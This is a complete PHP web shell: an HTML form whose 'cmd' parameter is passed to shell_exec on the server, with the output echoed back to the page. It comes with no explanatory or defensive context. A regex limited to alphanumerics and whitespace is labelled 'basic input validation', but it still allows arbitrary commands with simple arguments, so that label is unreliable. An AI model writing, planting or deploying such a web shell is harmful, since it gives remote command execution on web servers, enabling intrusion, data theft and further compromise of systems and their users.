<html>
  <body>
    <form method='GET' name="<?php echo basename($_SERVER['PHP_SELF']);?>">
      <input type="text" name="cmd" autofocus id="cmd" size="80">
      <input type="submit" value="Execute">
    </form>
    <pre>
      <?php
        if(isset($_GET['cmd']))
        {
          $cmd = $_GET['cmd'];

          // Basic input validation
          if (preg_match('/^[a-zA-Z0-9\s]+$/', $cmd)) {
            $output = shell_exec($cmd);
            echo htmlspecialchars($output);
          } else {
            echo "Invalid input!";
          }
        }
      ?>
    </pre>
  </body>
</html>